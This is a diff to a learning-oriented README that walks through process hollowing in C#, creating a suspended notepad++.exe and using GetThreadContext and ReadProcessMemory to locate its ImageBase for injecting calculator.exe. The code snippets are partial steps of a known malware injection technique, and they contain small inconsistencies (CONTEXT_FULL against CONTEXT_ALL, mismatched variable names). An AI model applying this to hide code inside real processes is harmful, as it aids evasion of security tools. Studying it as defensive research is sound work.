@@ -6,6 +6,7 @@ Learning Process Hollowing technique
 
 I want to try to inject a `calculator.exe` into `notepad++.exe` using the `Process Hollowing` technique.
 
+- [Overview of  Process Hollowing aka (Process Replacement/RunPE)](#overview-of--process-hollowing-aka--process-replacement-runpe-)
 - [Creating our Victim Process](#creating-our-victim-process)
   * [CreateProcessA Parameters](#createprocessa-parameters)
     + [lpApplicationName](#lpapplicationname)
@@ -18,11 +19,25 @@ I want to try to inject a `calculator.exe` into `notepad++.exe` using the `Proce
     + [lpStartupInfo](#lpstartupinfo)
     + [lpProcessInformation](#lpprocessinformation)
   * [Code Example](#code-example)
+- [Getting ThreadContext](#getting-threadcontext)
+  * [GetThreadContext Parameters](#getthreadcontext-parameters)
+    + [hThread](#hthread)
+    + [lpContext](#lpcontext)
+  * [Code Example](#code-example-1)
+- [Getting ImageBase from our victim process](#getting-imagebase-from-our-victim-process)
+  * [ReadProcessMemory Parameters](#readprocessmemory-parameters)
+    + [hProcess](#hprocess)
+    + [lpBaseAddress](#lpbaseaddress)
+    + [lpBuffer](#lpbuffer)
+    + [nSize](#nsize)
+    + [lpNumberOfBytesRead](#lpnumberofbytesread)
+  * [Code Example](#code-example-2)
 - [Hollowing our Victim Process](#hollowing-our-victim-process)
   * [ZwUnmapViewOfSection Parameters](#zwunmapviewofsection-parameters)
     + [ProcessHandle](#processhandle)
     + [BaseAddress](#baseaddress)
-  * [Code Example](#code-example-1)
+  * [Code Example](#code-example-3)
+
 
 # Overview of  Process Hollowing aka (Process Replacement/RunPE)
 
@@ -64,10 +79,10 @@ I will go ahead and leave this parameter to be NULL and specify our process name
 
 ### lpCommandLine
 
-Since our `lpApplicationName` is NULL, the first white space–delimited token of the command line specifies the process name. If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin. Furthermore, if we were to ommit our extension for our process, it will auto append `.exe`. Lets proceed to put the full path of `notepad++.exe` but avoid the extension.
+Since our `lpApplicationName` is NULL, the first white space–delimited token of the command line specifies the process name. If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin. Furthermore, if we were to ommit our extension for our process, it will auto append `.exe`. Lets proceed to put the full path of `notepad++.exe`.
 
 ```cs
-  string notepadPath = @"D:\Program Files\Notepad++\notepad++";
+  string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";
 ```
 
 ### lpProcessAttributes
@@ -91,7 +106,7 @@ I will be putting it as FALSE.
 
 The flags that control the priority class and the creation of the process. For a list of values, see [Process Creation Flags](https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags).
 
-We want to create a `SUSPENDED` process. Thus we will be using `CREATE_SUSPENDED` which has a value `0x4`.
+We want to create a `SUSPENDED` process. Thus we will be using the `CREATE_SUSPENDED` flag which has a value `0x4`.
 
 ### lpEnvironment
 
@@ -112,7 +127,7 @@ A pointer to a [PROCESS_INFORMATION](https://docs.microsoft.com/en-us/windows/de
 
 I ported the structure with the help from [PInvoke.Net ProcessInformation](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information).
 
-This is a very important structure as we would be using the thread handles from it.
+This is a very important structure as we would be using the `process and thread handles` from it.
 
 ## Code Example
 
@@ -167,9 +182,9 @@ We have successfully loaded our victim executable to memory, and it is now in a 
 
 # Getting ThreadContext
 
-The `ThreadContext` contains useful information like the location of the `EntryPoint` or `ImageBase`. These information can easily be obtained from the PE File itself, but it might not always be accurate due to [Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization).
+The `ThreadContext` contains useful information like the values of the `EntryPoint` or `ImageBase`. These information can easily be obtained from the PE File itself, but it might not always be accurate due to [Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization).
 
-Hence we need to get these values once the process has been loaded, in our case, once the process is stalled in the `SUSPENDED` state.
+Hence we need to get these values dynamically, once the process has been loaded, in our case, once the process `notepad++.exe` is stalled in the `SUSPENDED` state.
 
 So now how do we get the `ThreadContext`?
 
@@ -188,7 +203,7 @@ BOOL GetThreadContext(
 
 A handle to the thread whose context is to be retrieved. 
 
-Previously, when we called `CreateProcessA`, we passed in a `lpProcessInformation` which is of type [PROCESS_INFORMATION](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-process_information). The structure looks as follows in `C#`.
+Previously, when we called `CreateProcessA`, we passed in a `lpProcessInformation` which is of type [PROCESS_INFORMATION](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-process_information). The [structure](https://www.pinvoke.net/default.aspx/Structures/PROCESS_INFORMATION.html) looks as follows in `C#`.
 
 ```cs
 /// <summary>
@@ -227,14 +242,149 @@ IntPtr victimThreadHandle = processInformation.hThread;
 
 ### lpContext
 
-A pointer to a CONTEXT structure (such as ARM64_NT_CONTEXT) that receives the appropriate context of the specified thread. The value of the ContextFlags member of this structure specifies which portions of a thread's context are retrieved. The CONTEXT structure is highly processor specific. Refer to the WinNT.h header file for processor-specific definitions of this structures and any alignment requirements.
+A pointer to a CONTEXT structure that receives the appropriate context of the specified thread. The value of the ContextFlags member of this structure specifies which portions of a thread's context are retrieved. The CONTEXT structure is highly processor specific. Refer to the WinNT.h header file for processor-specific definitions of this structures and any alignment requirements.
 
+I ported the structure with the help from [PInvoke.Net CONTEXT64](http://www.pinvoke.net/default.aspx/kernel32/GetThreadContext.html).
+
+Next we need to create the context structure specifying `ContextFlags`. The flag to use would be `CONTEXT_FULL` to get the full context data.
+
+```cs
+ PInvoke.CONTEXT64 threadContext = new PInvoke.CONTEXT64() { ContextFlags = PInvoke.CONTEXT_FLAGS.CONTEXT_ALL };
+```
+
+As the [context](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext) structure needs to be aligned as stated in microsofts documentation,
+
+> Refer to the WinNT.h header file for processor-specific definitions of this structures and any alignment requirements.
+
+```cpp
+typedef struct DECLSPEC_ALIGN(16) DECLSPEC_NOINITALL _CONTEXT { ... }
+```
+
+The `CONTEXT` structure needs to be 16 bit aligned.
+
+I have created an `Allocate` function which accepts the size of dynamic memory needed and the alignment value.
+
+We now have to allocate unmanaged memory space for the context structure.
+
+```cs
+IntPtr pVictimThreadContext = Allocate(Marshal.SizeOf<PInvoke.CONTEXT64>(), 16);
+```
+
+Now that we have allocated space, I am going to translate the context from my managed memory structure variable `threadContext` to the unmanaged memory by
+
+```cs
+ Marshal.StructureToPtr<PInvoke.CONTEXT64>(victimThreadContext, pVictimThreadContext, false);
+```
+
+Once the translation has been performed, we can now call `GetThreadContext` as follows.
+
+```cs
+PInvoke.GetThreadContext(victimThreadHandle, pVictimThreadContext);
+```
+This will fill up all the context details into the unmanaged memory pointer `pVictimeThreadContext`.
+
+For easier reading, I translated the unmanaged memory back to our structure by
+
+```cs
+victimThreadContext = Marshal.PtrToStructure<PInvoke.CONTEXT64>(pVictimThreadContext);
+```
+
+## Code Example
+```cs
+IntPtr victimThreadHandle = processInformation.hThread;
+            
+PInvoke.CONTEXT64 victimThreadContext = new PInvoke.CONTEXT64() { ContextFlags = PInvoke.CONTEXT_FLAGS.CONTEXT_ALL };
+
+IntPtr pVictimThreadContext = Allocate(Marshal.SizeOf<PInvoke.CONTEXT64>(), 16);
+
+Marshal.StructureToPtr<PInvoke.CONTEXT64>(victimThreadContext, pVictimThreadContext, false);
+
+PInvoke.GetThreadContext(victimThreadHandle, pVictimThreadContext);
+
+victimThreadContext = Marshal.PtrToStructure<PInvoke.CONTEXT64>(pVictimThreadContext);
+```
 
 # Getting ImageBase from our victim process
 
+Now why did we get the `ThreadContext` of our victim process in the first place? 
 
+It is needed as the context contains details regarding `ImageBase` and `EntryPoint`. Lets tackle the retrieval of `ImageBase`.
 
-In order to get the `ThreadContext` of our victim process 
+Security Researchers found that Rdx was pointing to a memory location. `16 bytes` after it contains the address of the location of ImageBase.
+
+Thus we could get the `ImageBase` location's address by
+```cs
+ulong rdx = victimThreadContext.Rdx;
+ulong victimImageBaseAddress = rdx + 16;
+```
+
+Now that we got the address, we can read the `ImageBase` value from it by using the function `ReadProcessMemory`. More details of it can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory).
+
+```cpp
+BOOL ReadProcessMemory(
+  HANDLE  hProcess,
+  LPCVOID lpBaseAddress,
+  LPVOID  lpBuffer,
+  SIZE_T  nSize,
+  SIZE_T  *lpNumberOfBytesRead
+);
+```
+
+## ReadProcessMemory Parameters
+
+### hProcess
+
+A handle to the process with memory that is being read. 
+
+Just like how we got the `Thread Handle` previously from the `PROCESS_INFORMATION` structure, we can also obtain the `Process Handle` in a similar fashion.
+
+```cs
+IntPtr victimProcessHandle = processInformation.hProcess;
+```
+
+### lpBaseAddress
+A pointer to the base address in the specified process from which to read.
+
+We want to start reading from `victimImageBaseAddress`.
+
+### lpBuffer
+
+A pointer to a buffer that receives the contents from the address space of the specified process.
+
+Let's create `8 bytes` of unamanaged memory to store the `ImageBase`.
+
+```cs
+IntPtr victimImageBase = Marshal.AllocHGlobal(8);
+```
+
+Then we can perform the read,
+```cs
+PInvoke.ReadProcessMemory(victimProcessHandle, victimImageBaseAddress, victimImageBase, 8, out _);
+```
+
+### nSize
+
+The number of bytes to be read from the specified process.
+
+For 32-bit applications, the `ImageBase` is 4 bytes whereas for 64-bit, its 8 bytes.
+
+We will be reading 8 bytes as this injector is build to support for 64-bit applications.
+
+### lpNumberOfBytesRead
+A pointer to a variable that receives the number of bytes transferred into the specified buffer.
+
+For simplicity, I will be ignoring this field by using `C#'s` discard variable, `_`.
+
+## Code Example
+
+```cs
+ulong rdx = victimThreadContext.Rdx;
+ulong victimImageBaseAddress = rdx + 16;
+IntPtr victimProcessHandle = processInformation.hProcess;
+IntPtr victimImageBase = Marshal.AllocHGlobal(8);
+PInvoke.ReadProcessMemory(victimProcessHandle, victimImageBaseAddress, victimImageBase, 8, out _);
+```
+
 # Hollowing our Victim Process
 
 To hollow out our victim process, we need to unmap it from the memory, since its already currently loaded into memory but in a suspended state.
